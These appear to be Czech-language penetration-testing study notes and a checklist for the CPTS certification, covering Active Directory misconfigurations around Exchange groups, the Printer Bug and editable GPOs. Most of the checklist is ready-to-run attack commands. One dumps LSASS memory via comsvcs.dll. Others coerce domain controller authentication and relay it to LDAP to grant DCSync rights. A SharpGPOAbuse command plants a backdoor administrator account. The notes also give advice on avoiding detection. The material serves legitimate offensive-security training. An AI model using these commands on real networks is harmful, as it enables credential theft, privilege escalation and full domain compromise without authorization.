# Miscellaneous Misconfigurations

Tato část se zaměřuje na méně nápadné, ale vysoce kritické konfigurační nedostatky v Active Directory, které často vedou k eskalaci práv nebo úplnému ovládnutí domény.

1. Exchange Related Group Membership
2. PrivExchange
3. Printer Bug
4. MS14-068
5. Sniffing LDAP Credentials
6. Enumerating DNS Records
7. Password in Description Field
8. PASSWD_NOTREQD Field
9. Credentials in SMB Shares and SYSVOL Scripts
10. Group Policy Preferences (GPP) Passwords
11. ASREPRoasting
12. Group Policy Object (GPO) Abuse


## 1. Miskonfigurace spojené s MS Exchange

Výchozí instalace Microsoft Exchange (bez odděleného modelu správy) poskytuje Exchange serverům extrémní množství privilegií v AD prostřednictvím specifických skupin a ACL.

### A. Exchange Windows Permissions (skupina)

- **Riziko:** Tato skupina standardně **není** chráněná (není v AdminSDHolder), ale její členové mají právo **zapisovat DACL (WriteDACL) do doménového objektu**.
    
- **Zneužití:** Útočník, který získá kontrolu nad členem této skupiny (např. kompromitací účtu s právy _Account Operators_, který může do skupiny přidávat uživatele), si může sám sobě udělit **DCSync** práva a kompletně dumpnout celou databázi doménových hesel.
    

### B. Organization Management (skupina)

- **Riziko:** Tato skupina funguje jako "Domain Admins" pro celý Exchange. Má plný zápis a kontrolu nad organizační jednotkou (OU) `Microsoft Exchange Security Groups`.
    
- **Zneužití:** Člen této skupiny může ovládnout kteroukoli jinou skupinu spojenou s Exchange (včetně _Exchange Windows Permissions_), čímž opět získává přímou cestu k plnému ovládnutí domény.
    

### C. Dumpování paměti na Exchange serverech

- **Riziko:** Kvůli architektuře přihlašování (uživatelé přistupují přes Outlook Web Access - OWA) ukládají Exchange servery do paměti LSASS obrovské množství přihlašovacích údajů v čistém textu a hashech. Kompromitace tohoto serveru tak útočníkovi často poskytne stovky legitimních firemních identit.
    

## 2. Printer Bug (MS-RPRN)

- **Princip:** Legitimní funkce v tiskovém protokolu Windows (`RpcRemoteFindFirstPrinterChangeNotificationEx`). Libovolný ověřený doménový uživatel může přes toto rozhraní poslat požadavek tiskové službě (Print Spooler) na libovolném vzdáleném stroji (např. DC) a donutit tento stroj, aby se pokusil připojit zpět k útočníkovu stroji přes SMB.
    
- **Zneužití:** Vynucená SMB autentizace se nejčastěji zneužívá k:
    
    1. **NTLM Relaying na LDAP:** Útočník přepošle ověření na LDAP a udělí si DCSync práva.
        
    2. **RBCD (Resource-Based Constrained Delegation):** Vynutí se registrace škodlivého delegovacího oprávnění na cílovém stroji.
        
    3. **Útoky přes unconstrained delegation** napříč doménovými foresty.
        

## 3. Editable GPOs (Editovatelné Group Policy)

- **Riziko:** Situace, kdy má běžný uživatel nebo kompromitovaná skupina (např. Help Desk) práva pro úpravu (GenericAll / GenericWrite / WriteDacl) konkrétního objektu skupinové politiky (GPO).
    
- **Zneužití:** Útočník může do editovatelného GPO přidat:
    
    - Nového uživatele do lokální skupiny administrátorů (`Local Administrators`).
        
    - Okamžitou plánovanou úlohu (`Immediate Scheduled Task`), která na dotčených počítačích spustí reverzní shell.
        
    - Škodlivý spouštěcí skript počítače (`Computer Startup Script`).
        
- **OPSEC Varování pro CPTS:** Změny v GPO se aplikují na všechny počítače v organizační jednotce (OU), na kterou je GPO nalinkováno. Pokud GPO ovlivňuje 1 000 počítačů, přidání sebe sama jako lokálního admina na všechny tyto stroje způsobí obrovský hluk v síti a okamžité odhalení. Je nutné cílit pouze na vybrané hostitele (v rámci nástrojů specifikovat konkrétní target).

## CPTS Checklist: Miscellaneous Misconfigurations

## 🔲 Krok 1: Kontrola skupin spojených s Exchange

### 1. Kontrola členství ve skupinách (Exchange Windows Permissions / Organization Management) 

Cílem je zjistit, zda váš kompromitovaný uživatel (nebo skupina, ve které se nachází) není členem těchto kritických skupin.

- **Z Windows (PowerShell / PowerView):**
    
    PowerShell
    
    ```
    # Kontrola členů skupiny Exchange Windows Permissions
    Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
    
    # Kontrola členů skupiny Organization Management
    Get-NetGroupMember -Identity "Organization Management" -Recurse
    ```
    
- **Z Linuxu (pomocí BloodHound / Cypher query):** V BloodHoundu vyhledejte tyto skupiny a podívejte se na záložku **Members** nebo **Inbound Object Control**.
    

### 2. Ověření zápisu DACL do doménového objektu

Členové `Exchange Windows Permissions` mají právo zapisovat DACL na doménový objekt. Ověříte to takto:

PowerShell

```
Get-DomainObjectAcl -Identity "DC=inlanefreight,DC=local" -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -match "S-1-5-21-..." }
```

_(Dosadíte SID skupiny Exchange Windows Permissions. Hledáte práva jako `WriteDacl` nebo `All`.)_

### 3. Získání lokálního admina na Exchange a dumpování LSASS

Pokud získáte administrátorská práva na serveru Exchange, **vždy** dumpněte paměť LSASS. Kvůli webovému přihlašování OWA (Outlook Web Access) jsou zde uloženy stovky přihlašovacích údajů v čistém textu.

- **OPSEC bezpečný způsob (bez spuštění Mimikatzu na cíli):** Použijte vestavěnou knihovnu `comsvcs.dll` ke stažení paměti:
    
    DOS
    
    ```
    # Zjistěte PID procesu lsass.exe
    tasklist /fi "imagename eq lsass.exe"
    
    # Dumpněte paměť do souboru lsass.dmp (vyžaduje Admin práva)
    rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <PID_LSASS> C:\temp\lsass.dmp 24
    ```
    
    Následně si soubor `lsass.dmp` stáhněte do svého Linux útočného stroje a analyzujte jej offline pomocí:
    
    Bash
    
    ```
    pypykatz lsa minidump lsass.dmp
    ```
    

## 🔲 Krok 2: Ověření a zneužití Printer Bug (MS-RPRN)

### 1. Ověření, zda běží služba Print Spooler na cíli (např. na DC)

- **Z Linuxu (pomocí CrackMapExec / NetExec):**
    
    Bash
    
    ```
    nxc smb <Target_IP> -M spooler
    ```
    
- **Z Linuxu (pomocí rpcdump.py):**
    
    Bash
    
    ```
    rpcdump.py <Target_IP> | grep -A 2 -i "MS-RPRN"
    ```
    
    _(Pokud uvidíte UUID `12345678-1234-abcd-ef00-0123456789ab` pro Spooler Service, cíl je zranitelný)._
    

### 2. Zneužití: Vynucení autentizace a NTLM Relay na LDAP

Pokud je Spooler aktivní, můžete donutit DC, aby se autentizoval vůči vašemu stroji, a toto ověření přeposlat (Relaynout) na LDAP za účelem udělení DCSync práv.

1. **Spusťte ntlmrelayx na vašem útočném stroji:** Nastavte relay na LDAP doménového řadiče a specifikujte, že chcete eskalovat práva pro svého uživatele:
    
    Bash
    
    ```
    python3 ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <vas_uzivatel>
    ```
    
2. **Spusťte Printer Bug ke spuštění autentizace:** Použijte nástroj `dementor.py` nebo `printerbug.py` k odeslání požadavku na DC:
    
    Bash
    
    ```
    python3 dementor.py -u <uzivatel> -p <heslo> -d <domena> <IP_utocnika> <IP_domenoveho_radice>
    ```
    
    Jakmile DC obdrží požadavek, pošle NTLM ověření na váš `ntlmrelayx`, který ho relayne na LDAP a udělí vašemu uživateli práva DCSync. Následně můžete provést dump NTDS.
    

## 🔲 Krok 3: Analýza a zneužití editovatelných GPO

### 1. Vyhledání editovatelných GPO

Musíte najít GPO, ke kterému máte práva `WriteProperty`, `GenericWrite` nebo `GenericAll`.

- **Pomocí BloodHoundu (nejjednodušší):** Klikněte na svého uživatele/skupinu a podívejte se na vazby typu **WriteGPO** k objektům skupinové politiky.
    
- **Pomocí PowerView:**
    
    PowerShell
    
    ```
    Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -match "S-1-5-21-..." }
    ```
    

### 2. Zjištění, kam je GPO nalinkováno (Affected Hosts)

Musíte vědět, na jaká OU (Organizační jednotky) je toto GPO aplikováno, abyste věděli, které stroje kompromitujete.

- **Pomocí PowerView:**
    
    PowerShell
    
    ```
    # Získání detailů o konkrétním GPO podle názvu
    Get-DomainGPO -Identity "Nazev_GPO"
    
    # Zjištění, které OU odkazují na toto GPO GUID
    Get-DomainOU -GPLink "{GUID_GPO}"
    ```
    

### 3. OPSEC bezpečné zneužití (SharpGPOAbuse)

Chcete-li ovládnout pouze **jeden konkrétní stroj** (např. `SRV-01`) a nevyvolat poplach na zbylých 100 strojích v daném OU, musíte využít tzv. **Item-Level Targeting** (cílení na úrovni položek).

Použijeme nástroj **`SharpGPOAbuse.exe`** k vytvoření okamžité plánované úlohy (Immediate Scheduled Task), která poběží pod právy `SYSTEM`.

- **Příkaz pro vytvoření úlohy s cílením na konkrétní počítač:**
    
    DOS
    
    ```
    SharpGPOAbuse.exe --gponame "Nazev_Editable_GPO" --addcmdtask --taskname "SoftwareUpdate" --author "Administrator" --command "cmd.exe" --arguments "/c net user hacker Heslo123! /add && net localgroup administrators hacker /add" --targetcomputer "SRV-01.inlanefreight.local" --noninteractive
    ```
    
    _Parametr `--targetcomputer` zajistí, že přestože se GPO aplikuje na celé OU, škodlivá úloha se spustí **pouze** na stroji `SRV-01`._
    
- **Provedení aktualizace na cíli:** Aby se změna projevila ihned a nemuseli jste čekat na standardní interval aktualizace GPO (který je 90 minut), můžete na cílovém stroji (pokud na něj máte alespoň omezený přístup) vynutit aktualizaci:
    
    DOS
    
    ```
    gpupdate /force
    ```